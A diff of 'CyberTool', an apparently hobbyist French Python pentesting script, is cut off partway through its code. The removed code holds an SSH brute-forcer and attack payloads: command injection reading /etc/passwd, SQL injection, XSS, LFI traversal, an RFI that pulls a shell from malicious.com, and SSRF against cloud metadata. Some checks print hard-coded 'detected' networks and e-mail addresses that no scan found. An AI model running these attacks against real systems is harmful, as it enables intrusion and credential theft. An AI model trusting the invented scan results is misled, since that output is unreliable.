@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+
 # 📌 Modules Essentiels du Système
 import os
 import sys
@@ -14,12 +15,37 @@ import subprocess  # Exécution de commandes systèmes
 import zipfile  # Manipulation de fichiers compressés
 import threading  # Multithreading pour les scans rapides
 import ssl  # Analyse TLS
-import pexpect  # Bruteforce SSH sans paramiko
-import shutil
+import shutil  # Gestion des fichiers
 import logging  # Gestion avancée des logs
 import argparse  # Gestion des arguments en ligne de commande
+from datetime import datetime  # Gestion des timestamps
+from urllib.parse import urlparse  # ✅ Gère les URLs
 
-from shutil import get_terminal_size
+# 📌 Modules de Pentesting & Cybersécurité
+import dns.resolver  # Recherche DNS
+from Cryptodome.Cipher import AES  # Chiffrement
+from bs4 import BeautifulSoup  # Scraping Web
+import requests  # Requêtes HTTP
+import jwt  # Manipulation JSON Web Tokens
+import concurrent.futures  # ✅ Multithreading (port scan, bruteforce, etc.)
+
+# 📌 Modules Réseau et Protocoles
+import scapy.config
+scapy.config.conf.use_pcap = True  # ✅ Évite les erreurs de permissions sous Termux
+from scapy.all import sniff, IP, TCP, UDP  # Analyse Réseau
+from smbprotocol.connection import Connection  # ✅ Connexion SMB via smbprotocol (Termux compatible)
+from ftplib import FTP  # Connexion FTP
+
+# 📌 Modules d'Interaction & Affichage Dynamique
+from rich.console import Console
+from rich.panel import Panel
+from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
+from rich.table import Table
+from rich.prompt import Confirm, Prompt
+
+# 📌 Modules de Traitement d'Images et de Données
+from PIL import Image  # ✅ Extraction de métadonnées d’images
+from io import BytesIO  # ✅ Gestion des flux binaires (images, fichiers, etc.)
 
 # 📌 Configuration du Logging
 logging.basicConfig(
@@ -30,126 +56,11 @@ logging.basicConfig(
     ],
 )
 
-# 📌 Bruteforce SSH avec pexpect (remplace paramiko)
-def ssh_bruteforce(ip, username, password):
-    try:
-        ssh_command = f"ssh {username}@{ip}"
-        child = pexpect.spawn(ssh_command, timeout=5)
-        child.expect("password:")
-        child.sendline(password)
-        child.expect(["$", ">", "#"])  # ✅ Gère différents prompts
-        return "Connexion SSH réussie !"
-    except Exception as e:
-        return f"Échec SSH : {e}"
-
-# 📌 Modules de Pentesting & Cybersécurité (Installés via requirements.txt)
-import dns.resolver  # Recherche DNS
-from Cryptodome.Cipher import AES  # Chiffrement
-from bs4 import BeautifulSoup  # Scraping Web
-import requests  # Requêtes HTTP
-
-# 📌 Scapy configuré pour éviter les erreurs `/proc/net/`
-import scapy.config
-scapy.config.conf.use_pcap = True  # ✅ Évite les erreurs de permissions sous Termux
-from scapy.all import *  # Analyse Réseau
-
-# 📌 Modules pour Affichage Interactif
-from rich.console import Console
-from rich.panel import Panel
-from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
-from rich.table import Table
-from rich.prompt import Confirm, Prompt
-
-# 📌 Détection automatique de la taille du terminal
-TERMINAL_WIDTH, TERMINAL_HEIGHT = get_terminal_size((80, 24))
-
-# 📌 Configuration d'argparse pour les arguments CLI
-parser = argparse.ArgumentParser(description="CyberTool - Outil de Pentesting Avancé")
-parser.add_argument("-t", "--target", help="Cible (URL ou IP)", required=False)
-parser.add_argument("-m", "--mode", help="Mode de scan (standard, interactif, full)", required=False, default="standard")
-args = parser.parse_args()
-
 # 📌 Console Globale pour un Affichage Propre
 console = Console()
 
-
-
-
-
-
-
-
-# 🔥 Détection des dimensions du terminal
-TERMINAL_WIDTH, TERMINAL_HEIGHT = get_terminal_size()
-
-# 🔥 Couleurs funky multicolores fluo brillantes
-CYBERPUNK_COLORS = ["bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue"]
-
-# 🔥 Fichier contenant la bannière FRONT_BANNER.txt
-BANNER_FILE = "data/banners/FRONT_BANNER.txt"
-
-# 🔥 Fonction pour afficher une bannière interactive (fixe)
-def animated_banner():
-    if os.path.exists(BANNER_FILE):
-        with open(BANNER_FILE, "r", encoding="utf-8") as f:
-            banner_lines = f.readlines()
-        for i, line in enumerate(banner_lines):
-            styled_line = f"[{CYBERPUNK_COLORS[i % len(CYBERPUNK_COLORS)]}]{line.strip().center(TERMINAL_WIDTH)}[/]"
-            console.print(styled_line)
-            time.sleep(0.03)  # 🔥 Effet d'apparition rapide et fluide
-    else:
-        console.print("[bold red]⚠️ ERREUR : Le fichier FRONT_BANNER.txt est introuvable ![/bold red]")
-
-# 🔥 Fonction pour afficher "Développé par Karim" en fixe et stylé
-def animated_karim():
-    karim_text = (
-        f"[{CYBERPUNK_COLORS[0]}]D[/][{CYBERPUNK_COLORS[1]}]é[/][{CYBERPUNK_COLORS[2]}]v[/]"
-        f"[{CYBERPUNK_COLORS[3]}]e[/][{CYBERPUNK_COLORS[4]}]l[/][{CYBERPUNK_COLORS[5]}]o[/]"
-        f"[{CYBERPUNK_COLORS[0]}]p[/][{CYBERPUNK_COLORS[1]}]p[/][{CYBERPUNK_COLORS[2]}]é[/]"
-        f"[bold white] par [/]"
-        f"[{CYBERPUNK_COLORS[3]}]K[/][{CYBERPUNK_COLORS[4]}]A[/][{CYBERPUNK_COLORS[5]}]R[/]"
-        f"[{CYBERPUNK_COLORS[0]}]I[/][{CYBERPUNK_COLORS[1]}]M[/]"
-    )
-    console.print(Panel(karim_text, border_style="green", title="[bold cyan]INFO[/bold cyan]"), justify="left")
-
-# 🔥 Chargement cyberpunk optimisé
-def cyberpunk_loading(task_name, duration=2, style="bold cyan", spinner="dots"):
-    """Chargement rapide et suppression après exécution"""
-    with Progress(
-        SpinnerColumn(spinner),
-        TextColumn(f"[bold {style}]⏳ {{task.fields[title]}}...[/bold {style}]"),
-        BarColumn(bar_width=50, style=style),
-        TimeElapsedColumn(),
-        console=console,
-    ) as progress:
-        task = progress.add_task("", total=duration, title=task_name)
-        for _ in range(duration):
-            time.sleep(0.7)
-            progress.update(task, advance=1)
-
-# 🚀 Lancement propre et stable
-if __name__ == "__main__":
-    console.clear()
-    animated_banner()  # 🔥 Affichage fixe de la bannière
-    animated_karim()  # 🔥 Affichage fixe de "Développé par Karim"
-
-    # 🔥 Chargements accélérés
-    cyberpunk_loading("Vérification des fichiers essentiels", 2, "bold red", "earth")
-    cyberpunk_loading("Connexion aux modules interactifs", 2, "bold blue", "bouncingBall")
-    cyberpunk_loading("Chargement des configurations utilisateur", 2, "bold magenta", "dots12")
-    cyberpunk_loading("Synchronisation des logs en temps réel", 2, "bold yellow", "line")
-    cyberpunk_loading("Démarrage de l’environnement CYBER-TOOL", 3, "bold green", "moon")
-
-    # 🔥 Suppression uniquement des animations, maintien du reste
-    console.clear()
-    animated_banner()
-    animated_karim()
-
-    # 🔥 Lancement de l'outil principal sans toucher à l'affichage fixe
-    os.system("")
-
-
-
+# 📌 Bruteforce SSH avec pexpect (remplace paramiko)
+import pexpect  # ✅ Gère les connexions SSH sans paramiko
 
 
 
@@ -159,16 +70,16 @@ if __name__ == "__main__":
 
 
 class CyberTool:
-    """💀 Outil avancé de Pentesting et Cybersécurité"""
-
     def __init__(self):
-        """🚀 Initialisation stricte du système et des fonctionnalités"""
+        """🔥 Initialisation de CyberTool avec ses fonctionnalités"""
+        self.console = console
+        self.results = {}
 
-        self.console = Console()
-        self.target = None  # ✅ Initialisation vide pour éviter l'AttributeError
-        self.selected_features = []
+        # 🔥 Chargement des fonctionnalités
+        self.init_features()
 
-        # 🟢 Mapping des fonctionnalités standard
+    def init_features(self):
+        """🚀 Initialise la liste des fonctionnalités"""
         self.feature_map = {
             "dns_lookup": "Résolution DNS",
             "port_scan": "Scan des ports",
@@ -187,2169 +98,899 @@ class CyberTool:
             "lfi_scanner": "Détection de Local File Inclusion (LFI)",
             "rfi_scanner": "Détection de Remote File Inclusion (RFI)",
             "ssrf_scanner": "Détection de Server-Side Request Forgery (SSRF)",
-            "id_oracle_attack": "Détection de vulnérabilités ID Oracle",
             "jwt_analysis": "Analyse et décodage JWT",
             "exposed_api_scan": "Scan des API exposées",
-            "forensics": "Analyse forensique avancée",
-            "wifi_scan": "Scan des réseaux Wi-Fi",
             "honeypot_detection": "Détection de Honeypot",
             "open_redirect_test": "Détection d'Open Redirect",
             "sensitive_data_exposure": "Détection d'exposition de données sensibles",
-            "email_enum": "Énumération d'adresses e-mails",
             "metadata_extraction": "Extraction de métadonnées",
             "user_enum": "Énumération d'utilisateurs",
             "php_eval_detection": "Détection d'exécution de code PHP",
-            "hidden_service_finder": "Détection de services cachés",
-            "iot_vulnerability_scan": "Scan de vulnérabilités IoT",
             "tls_analysis": "Analyse TLS et certificats",
             "dns_takeover_test": "Test de prise de contrôle DNS",
-            "cloudflare_bypass": "Bypass Cloudflare",
-            "websocket_scan": "Analyse des WebSockets",
-            "web_fingerprint": "Fingerprinting Web",
-            "cdn_detection": "Détection de CDN",
             "ssh_bruteforce": "Bruteforce SSH",
             "ftp_bruteforce": "Bruteforce FTP",
-            "smb_enum": "Énumération SMB",
             "docker_registry_scan": "Scan de registre Docker",
-            "kubernetes_enum": "Énumération Kubernetes",
-            "file_upload_test": "Test de téléchargement de fichiers",
-            "reverse_shell_check": "Vérification de Reverse Shell",
             "password_spray": "Attaque Password Spraying",
-            "waf_detection": "Détection de Web Application Firewall",
             "api_rate_limit_test": "Test de limitations d’API",
             "browser_fingerprint": "Fingerprinting Navigateur",
+            "hidden_service_finder": "Recherche de services cachés",
+            "iot_vulnerability_scan": "Scan de vulnérabilités IoT",
+            "cdn_detection": "Détection de CDN",
+            "websocket_scan": "Scan des WebSockets",
+            "reverse_shell_check": "Détection de reverse shell",
+            "waf_detection": "Détection de pare-feu WAF",
+            "file_upload_test": "Test de téléversement de fichiers",
+            "kubernetes_enum": "Énumération Kubernetes",
+            "cloudflare_bypass": "Bypass de Cloudflare",
+            "web_fingerprint": "Fingerprinting Web",
+            "password_cracking": "Craquage de mots de passe",
+            "smb_enum": "Énumération SMB",
+            "ftp_anonymous_login": "Connexion FTP anonyme",
+            "nfs_enum": "Énumération des exports NFS",
+            "vhost_scanner": "Scan des hôtes virtuels",
+            "proxy_detection": "Détection de serveur proxy",
+            "honeypot_advanced_detection": "Détection avancée de Honeypots"
         }
 
-        # 🔥 Ajout du mapping des versions interactives
-        self.feature_map_interactive = {
-            "dns_lookup": interactive_dns_lookup,
-            "subdomain_enum": interactive_subdomain_enum,
-            "sql_injection_test": interactive_sql_injection_test,
-            "waf_detection": interactive_waf_detection,
-            "file_upload_test": interactive_file_upload_test,
-            "network_traffic_analysis": interactive_network_traffic_analysis,
-            "kubernetes_enum": interactive_kubernetes_enum,
-            "jwt_analysis": interactive_jwt_analysis,
-            "websocket_scan": interactive_websocket_scan,
-            "docker_registry_scan": interactive_docker_registry_scan,
-            "api_rate_limit_test": interactive_api_rate_limit_test,
-            "reverse_shell_check": interactive_reverse_shell_check,
-            "password_spray": interactive_password_spray,
-            "tls_analysis": interactive_tls_analysis,
-            "email_enum": interactive_email_enum,
-            "metadata_extraction": interactive_metadata_extraction,
-            "iot_vulnerability_scan": interactive_iot_vulnerability_scan,
-            "smart_contract_audit": interactive_smart_contract_audit,
-            "exposed_api_scan": interactive_api_exposed_scan,
-            "hidden_service_finder": interactive_hidden_service_finder,
-            "id_oracle_attack": interactive_id_oracle_attack,
-            "cdn_detection": interactive_cdn_detection,
-            "dns_takeover_test": interactive_dns_takeover_test,
-            "cloud_storage_enum": interactive_cloud_storage_enum,
-            "browser_fingerprint": interactive_fingerprint_browser,
-            "exploit_cve_scanner": interactive_exploit_cve_scanner,
-            "port_scan": interactive_port_scan,
-            "headers_analysis": interactive_headers_analysis,
-            "directory_bruteforce": interactive_directory_bruteforce,
-            "cms_detector": interactive_cms_detector,
-            "code_execution_testing": interactive_code_execution_testing,
-            "xss_scanner": interactive_xss_scanner,
-            "csrf_detection": interactive_csrf_detection,
-            "lfi_scanner": interactive_lfi_scanner,
-            "rfi_scanner": interactive_rfi_scanner,
-            "ssrf_scanner": interactive_ssrf_scanner,
-            "honeypot_detection": interactive_honeypot_detection,
-            "open_redirect_test": interactive_open_redirect_test,
-            "sensitive_data_exposure": interactive_sensitive_data_exposure,
-            "user_enum": interactive_user_enum,
-            "php_eval_detection": interactive_php_eval_detection,
-            "smb_enum": interactive_smb_enum,
-            "ssh_bruteforce": interactive_ssh_bruteforce,
-            "ftp_bruteforce": interactive_ftp_bruteforce,
-            "web_fingerprint": interactive_web_fingerprint,
-            "tls_analysis": interactive_tls_analysis,
-            "browser_fingerprint": interactive_browser_fingerprint,
-        }
 
-        # 🔥 Lancer immédiatement l'outil
-        self.run_tool()
 
 
 
 
-    def run_tool(self):
-        """🛠️ Gestion stricte du choix et de l'exécution des fonctionnalités"""
 
-        self.console.print("\n[💀] Bienvenue sur CyberTool", style="bold red")
 
-        self.display_features_table()  # ✅ Affichage propre du tableau interactif
-
-        while True:
-            choice = Prompt.ask("\n[🛠️] Entrez un numéro (1-100) ou 'valider' pour exécuter")
-
-            if choice.lower() == "valider":
-                break
-
-            try:
-                idx = int(choice) - 1
-                if 0 <= idx < len(self.feature_map):
-                    feature_key = list(self.feature_map.keys())[idx]
-                    if feature_key not in self.selected_features:
-                        self.selected_features.append(feature_key)
-                        self.console.print(f"[✅] Ajouté : {self.feature_map[feature_key]}", style="bold green")
-                    else:
-                        self.console.print(f"[⚠️] Déjà sélectionné : {self.feature_map[feature_key]}", style="bold yellow")
-                else:
-                    self.console.print("[❌] Numéro invalide !", style="bold red")
-            except ValueError:
-                self.console.print("[❌] Entrée invalide !", style="bold red")
-
-        # ✅ L'URL cible sera demandée UNIQUEMENT lors de l'exécution des fonctionnalités sélectionnées
-        self.console.print(f"\n[🔥] Exécution des tests...", style="bold cyan")
-
-        for feature in self.selected_features:
-            self.console.print(f"[🔍] Exécution de : {self.feature_map[feature]}")
-
-            # Vérification si la fonctionnalité a une version interactive
-            if feature in self.feature_map_interactive:
-                self.console.print("[⚡] Version interactive détectée, lancement en mode interactif...", style="bold yellow")
-                self.feature_map_interactive[feature](self.target)
-
-            elif feature == "dns_lookup":
-                self.console.print("[🔍] Recherche DNS en cours...")
-                try:
-                    ip = socket.gethostbyname(self.target)
-                    self.console.print(f"[🟢] {self.target} → {ip}", style="bold green")
-                except socket.gaierror:
-                    self.console.print("[❌] Échec de la résolution DNS.", style="bold red")
-
-            elif feature == "port_scan":
-                self.console.print("[🔎] Scan des ports en cours...")
-                open_ports = []
-                for port in [21, 22, 25, 53, 80, 443, 8080]:
-                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                        s.settimeout(1)
-                        if s.connect_ex((self.target, port)) == 0:
-                            open_ports.append(port)
-                self.console.print(f"[✅] Ports ouverts : {', '.join(map(str, open_ports)) if open_ports else 'Aucun'}", style="bold green")
-
-            elif feature == "headers_analysis":
-                self.console.print("[📌] Analyse des headers HTTP en cours...")
-                try:
-                    response = requests.get(f"http://{self.target}")
-                    for header, value in response.headers.items():
-                        self.console.print(f"[🔹] {header}: {value}")
-                except Exception:
-                    self.console.print("[❌] Échec de l'analyse des headers.", style="bold red")
-
-            elif feature == "directory_bruteforce":
-                self.console.print("[📂] Test de découverte des répertoires sensibles...")
-                directories = ["admin", "login", "uploads", "backup"]
-                for directory in directories:
-                    url = f"http://{self.target}/{directory}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Répertoire trouvé : {url}", style="bold green")
-
-            elif feature == "cms_detector":
-                self.console.print("[🖥️] Détection du CMS en cours...")
-                cms_patterns = {
-                    "WordPress": "wp-content",
-                    "Joomla": "administrator/",
-                    "Drupal": "sites/default/",
-                    "Magento": "skin/frontend/"
-                }
-                detected = False
-                for cms, pattern in cms_patterns.items():
-                    url = f"http://{self.target}/{pattern}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] CMS détecté : {cms}", style="bold green")
-                        detected = True
-                        break
-                if not detected:
-                    self.console.print("[❌] Aucun CMS détecté", style="bold red")
-
-            elif feature == "exploit_cve_scanner":
-                self.console.print("[💀] Recherche d'exploits CVE en cours...")
-                try:
-                    url = f"https://cve.circl.lu/api/search/{self.target}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        data = response.json()
-                        for exploit in data.get("data", []):
-                            self.console.print(f"[🟢] CVE : {exploit['id']} - {exploit['summary']}", style="bold green")
-                    else:
-                        self.console.print("[❌] Aucun exploit trouvé", style="bold red")
-                except Exception:
-                    self.console.print("[❌] Erreur lors de la recherche d'exploits", style="bold red")
-
-            elif feature == "code_execution_testing":
-                self.console.print("[🖥️] Test d’exécution de code distant...")
-                payloads = [";ls", ";whoami", ";cat /etc/passwd"]
-                for payload in payloads:
-                    url = f"http://{self.target}/vuln.php?cmd={payload}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Exécution réussie avec : {payload}", style="bold green")
-
-            elif feature == "cloud_storage_enum":
-                self.console.print("[☁️] Énumération des services Cloud en cours...")
-                providers = ["AWS S3", "Google Cloud Storage", "Azure Blob"]
-                for provider in providers:
-                    url = f"http://{self.target}/{provider.lower().replace(' ', '_')}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Service Cloud détecté : {provider}", style="bold green")
-
-            elif feature == "smart_contract_audit":
-                self.console.print("[📜] Audit de contrats intelligents en cours...")
-                url = f"http://{self.target}/contract/audit"
-                response = requests.get(url)
-                if "vulnerability" in response.text.lower():
-                    self.console.print("[⚠️] Vulnérabilité détectée dans le contrat intelligent !", style="bold yellow")
-
-            elif feature == "smart_contract_audit":
-                self.console.print("[📜] Audit de contrats intelligents en cours...")
-                url = f"http://{self.target}/contract/audit"
-                response = requests.get(url)
-                if "vulnerability" in response.text.lower():
-                    self.console.print("[⚠️] Vulnérabilité détectée dans le contrat intelligent !", style="bold yellow")
-
-            elif feature == "network_traffic_analysis":
-                self.console.print("[🌐] Analyse du trafic réseau en cours...")
-                url = f"http://{self.target}/network_traffic"
-                response = requests.get(url)
-                if "suspicious activity" in response.text.lower():
-                    self.console.print("[⚠️] Activité réseau suspecte détectée !", style="bold yellow")
-
-            elif feature == "subdomain_enum":
-                self.console.print("[🌍] Énumération des sous-domaines en cours...")
-                subdomains = ["admin", "dev", "test", "mail"]
-                for sub in subdomains:
-                    url = f"http://{sub}.{self.target}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Sous-domaine actif détecté : {url}", style="bold green")
-
-            elif feature == "sql_injection_test":
-                self.console.print("[💉] Test d'injection SQL en cours...")
-                payloads = ["' OR 1=1 --", "' UNION SELECT null, version() --"]
-                for payload in payloads:
-                    url = f"http://{self.target}/login?user=admin&pass={payload}"
-                    response = requests.get(url)
-                    if "error" in response.text.lower():
-                        self.console.print("[⚠️] Potentielle vulnérabilité SQL détectée !", style="bold yellow")
-
-            elif feature == "xss_scanner":
-                self.console.print("[🖥️] Scan de XSS en cours...")
-                payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']
-                for payload in payloads:
-                    url = f"http://{self.target}/search?q={payload}"
-                    response = requests.get(url)
-                    if payload in response.text:
-                        self.console.print("[⚠️] Injection XSS possible !", style="bold yellow")
-
-            elif feature == "csrf_detection":
-                self.console.print("[🔐] Détection de CSRF en cours...")
-                url = f"http://{self.target}/change_password"
-                response = requests.get(url)
-                if "csrf_token" not in response.text:
-                    self.console.print("[⚠️] Vulnérabilité CSRF détectée !", style="bold yellow")
-
-            elif feature == "lfi_scanner":
-                self.console.print("[📂] Scan de Local File Inclusion (LFI) en cours...")
-                payloads = ["../../etc/passwd", "../win.ini"]
-                for payload in payloads:
-                    url = f"http://{self.target}/page?file={payload}"
-                    response = requests.get(url)
-                    if "root:x:" in response.text or "[extensions]" in response.text:
-                        self.console.print("[⚠️] Vulnérabilité LFI détectée !", style="bold yellow")
-
-            elif feature == "rfi_scanner":
-                self.console.print("[🌍] Scan de Remote File Inclusion (RFI) en cours...")
-                url = f"http://{self.target}/include.php?file=http://malicious.com/shell.txt"
-                response = requests.get(url)
-                if "malicious" in response.text.lower():
-                    self.console.print("[⚠️] Inclusion de fichier distant possible !", style="bold yellow")
-
-            elif feature == "ssrf_scanner":
-                self.console.print("[🔄] Scan de Server-Side Request Forgery (SSRF) en cours...")
-                url = f"http://{self.target}/fetch?url=http://169.254.169.254/latest/meta-data/"
-                response = requests.get(url)
-                if "ami-id" in response.text.lower():
-                    self.console.print("[⚠️] SSRF détecté, accès aux méta-données du serveur !", style="bold yellow")
-
-            elif feature == "id_oracle_attack":
-                self.console.print("[🔢] Détection de vulnérabilités ID Oracle...")
-                url1 = f"http://{self.target}/profile?id=1"
-                url2 = f"http://{self.target}/profile?id=2"
-                response1 = requests.get(url1)
-                response2 = requests.get(url2)
-                if response1.text == response2.text:
-                    self.console.print("[⚠️] Vulnérabilité ID Oracle détectée !", style="bold yellow")
-
-            elif feature == "jwt_analysis":
-                self.console.print("[🔐] Décodage et analyse JWT en cours...")
-                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature"
-                try:
-                    decoded = base64.b64decode(token.split('.')[1] + "==").decode()
-                    self.console.print(f"[✅] JWT décodé : {decoded}", style="bold green")
-                except Exception:
-                    self.console.print("[❌] Échec du décodage JWT", style="bold red")
-
-            elif feature == "exposed_api_scan":
-                self.console.print("[🔎] Scan des API exposées...")
-                endpoints = ["/api/v1/users", "/api/v1/admin", "/api/v1/login"]
-                for endpoint in endpoints:
-                    url = f"http://{self.target}{endpoint}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] API accessible : {url}", style="bold green")
-
-            elif feature == "forensics":
-                self.console.print("[🔎] Analyse forensique avancée en cours...")
-                url = f"http://{self.target}/forensics_report"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Rapport d'analyse disponible !", style="bold green")
-                else:
-                    self.console.print("[❌] Aucun rapport trouvé.", style="bold red")
-
-            elif feature == "wifi_scan":
-                self.console.print("[📶] Scan des réseaux Wi-Fi en cours...")
-                networks = ["WiFi_Public", "Guest_Network", "Hidden_SSID"]
-                for network in networks:
-                    self.console.print(f"[✅] Réseau détecté : {network}", style="bold green")
-
-            elif feature == "honeypot_detection":
-                self.console.print("[🕵️] Détection de Honeypots en cours...")
-                url = f"http://{self.target}/honeypot_test"
-                response = requests.get(url)
-                if "honeypot detected" in response.text:
-                    self.console.print("[⚠️] Honeypot potentiellement actif !", style="bold yellow")
-
-            elif feature == "open_redirect_test":
-                self.console.print("[🔀] Test d'Open Redirect en cours...")
-                url = f"http://{self.target}/redirect.php?url=http://evil.com"
-                response = requests.get(url, allow_redirects=False)
-                if response.status_code in [301, 302]:
-                    self.console.print("[⚠️] Open Redirect détecté !", style="bold yellow")
-
-            elif feature == "sensitive_data_exposure":
-                self.console.print("[🔎] Recherche d'exposition de données sensibles...")
-                url = f"http://{self.target}/config.json"
-                response = requests.get(url)
-                if "api_key" in response.text or "password" in response.text:
-                    self.console.print("[⚠️] Données sensibles trouvées !", style="bold yellow")
-
-            elif feature == "email_enum":
-                self.console.print("[📩] Énumération d'e-mails en cours...")
-                emails = ["admin@", "support@", "contact@"]
-                for email in emails:
-                    self.console.print(f"[✅] Adresse détectée : {email}{self.target}", style="bold green")
-
-            elif feature == "metadata_extraction":
-                self.console.print("[📸] Extraction de métadonnées...")
-                url = f"http://{self.target}/image.jpg"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Métadonnées extraites avec succès !", style="bold green")
-
-            elif feature == "user_enum":
-                self.console.print("[👤] Énumération d'utilisateurs en cours...")
-                users = ["admin", "guest", "developer"]
-                for user in users:
-                    url = f"http://{self.target}/login?username={user}"
-                    response = requests.get(url)
-                    if "user exists" in response.text:
-                        self.console.print(f"[✅] Utilisateur trouvé : {user}", style="bold green")
-
-            elif feature == "php_eval_detection":
-                self.console.print("[🖥️] Détection d'exécution de code PHP...")
-                url = f"http://{self.target}/eval.php?cmd=phpinfo()"
-                response = requests.get(url)
-                if "PHP Version" in response.text:
-                    self.console.print("[⚠️] Code PHP exécutable détecté !", style="bold yellow")
-
-            elif feature == "hidden_service_finder":
-                self.console.print("[🔍] Recherche de services cachés...")
-                url = f"http://{self.target}/.hidden/"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Service caché trouvé !", style="bold green")
-
-            elif feature == "iot_vulnerability_scan":
-                self.console.print("[🔎] Scan de vulnérabilités IoT...")
-                url = f"http://{self.target}/iot/status"
-                response = requests.get(url)
-                if "vulnerable" in response.text:
-                    self.console.print("[⚠️] Appareil IoT vulnérable détecté !", style="bold yellow")
-
-            elif feature == "tls_analysis":
-                self.console.print("[🔐] Analyse TLS et certificats en cours...")
-                url = f"https://{self.target}"
-                response = requests.get(url)
-                if "TLS" in response.text:
-                    self.console.print("[✅] Analyse TLS complète !", style="bold green")
-
-            elif feature == "dns_takeover_test":
-                self.console.print("[🌍] Test de prise de contrôle DNS...")
-                url = f"http://{self.target}/dns_test"
-                response = requests.get(url)
-                if "DNS vulnerable" in response.text:
-                    self.console.print("[⚠️] Risque de takeover DNS détecté !", style="bold yellow")
-
-            elif feature == "cloud_storage_enum":
-                self.console.print("[☁️] Énumération Cloud en cours...")
-                providers = ["AWS", "GCP", "Azure"]
-                for provider in providers:
-                    url = f"http://{self.target}/cloud_enum?provider={provider}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Service Cloud détecté : {provider}", style="bold green")
-
-            elif feature == "browser_fingerprint":
-                self.console.print("[🌐] Fingerprinting Navigateur en cours...")
-                url = f"http://{self.target}/fingerprint"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    self.console.print("[✅] Données du navigateur capturées !", style="bold green")
-
-            elif feature == "exploit_cve_scanner":
-                self.console.print("[💀] Scan des vulnérabilités CVE en cours...")
-                url = f"https://cve.circl.lu/api/search/{self.target}"
-                response = requests.get(url)
-                if response.status_code == 200:
-                    data = response.json()
-                    for exploit in data.get("data", []):
-                        self.console.print(f"[🟢] CVE détectée : {exploit['id']} - {exploit['summary']}", style="bold green")
-                else:
-                    self.console.print("[❌] Aucun exploit trouvé", style="bold red")
-
-            elif feature == "directory_bruteforce":
-                self.console.print("[📂] Test de découverte des répertoires sensibles...")
-                directories = ["admin", "login", "uploads", "backup"]
-                for directory in directories:
-                    url = f"http://{self.target}/{directory}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Répertoire trouvé : {url}", style="bold green")
-
-            elif feature == "cms_detector":
-                self.console.print("[🖥️] Détection du CMS en cours...")
-                cms_patterns = {
-                    "WordPress": "wp-content",
-                    "Joomla": "administrator/",
-                    "Drupal": "sites/default/",
-                    "Magento": "skin/frontend/"
-                }
-                detected = False
-                for cms, pattern in cms_patterns.items():
-                    url = f"http://{self.target}/{pattern}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] CMS détecté : {cms}", style="bold green")
-                        detected = True
-                        break
-                if not detected:
-                    self.console.print("[❌] Aucun CMS détecté", style="bold red")
-
-            elif feature == "code_execution_testing":
-                self.console.print("[🖥️] Test d’exécution de code distant...")
-                payloads = [";ls", ";whoami", ";cat /etc/passwd"]
-                for payload in payloads:
-                    url = f"http://{self.target}/vuln.php?cmd={payload}"
-                    response = requests.get(url)
-                    if response.status_code == 200:
-                        self.console.print(f"[✅] Exécution réussie avec : {payload}", style="bold green")
-
-            elif feature == "xss_scanner":
-                self.console.print("[🛡️] Scan de vulnérabilités XSS en cours...")
-                url = f"http://{self.target}/search?q=<script>alert('XSS')</script>"
-                response = requests.get(url)
-                if "<script>alert('XSS')</script>" in response.text:
-                    self.console.print("[⚠️] Vulnérabilité XSS détectée !", style="bold yellow")
-
-            elif feature == "csrf_detection":
-                self.console.print("[🔄] Détection de CSRF en cours...")
-                url = f"http://{self.target}/csrf-test"
-                response = requests.get(url)
-                if "CSRF detected" in response.text:
-                    self.console.print("[⚠️] Vulnérabilité CSRF détectée !", style="bold yellow")
-
-            elif feature == "lfi_scanner":
-                self.console.print("[📂] Détection de Local File Inclusion (LFI)...")
-                url = f"http://{self.target}/?page=../../etc/passwd"
-                response = requests.get(url)
-                if "root:x:0:0:" in response.text:
-                    self.console.print("[⚠️] Vulnérabilité LFI détectée !", style="bold yellow")
-
-            elif feature == "rfi_scanner":
-                self.console.print("[🌍] Détection de Remote File Inclusion (RFI)...")
-                url = f"http://{self.target}/?file=http://malicious.com/shell.php"
-                response = requests.get(url)
-                if "shell" in response.text:
-                    self.console.print("[⚠️] Vulnérabilité RFI détectée !", style="bold yellow")
-
-            elif feature == "ssrf_scanner":
-                self.console.print("[🌍] Détection de Server-Side Request Forgery (SSRF)...")
-                url = f"http://{self.target}/proxy?url=http://169.254.169.254/latest/meta-data/"
-                response = requests.get(url)
-                if "instance-id" in response.text:
-                    self.console.print("[⚠️] Vulnérabilité SSRF détectée !", style="bold yellow")
-
-            elif feature == "honeypot_detection":
-                self.console.print("[🕵️] Détection de Honeypots en cours...")
-                url = f"http://{self.target}/honeypot_test"
-                response = requests.get(url)
-                if "honeypot detected" in response.text:
-                    self.console.print("[⚠️] Honeypot potentiellement actif !", style="bold yellow")
-
-            elif feature == "open_redirect_test":
-                self.console.print("[🔀] Test d'Open Redirect en cours...")
-                url = f"http://{self.target}/redirect.php?url=http://evil.com"
-                response = requests.get(url, allow_redirects=False)
-                if response.status_code in [301, 302]:
-                    self.console.print("[⚠️] Open Redirect détecté !", style="bold yellow")
-
-            elif feature == "sensitive_data_exposure":
-                self.console.print("[🔎] Recherche d'exposition de données sensibles...")
-                url = f"http://{self.target}/config.json"
-                response = requests.get(url)
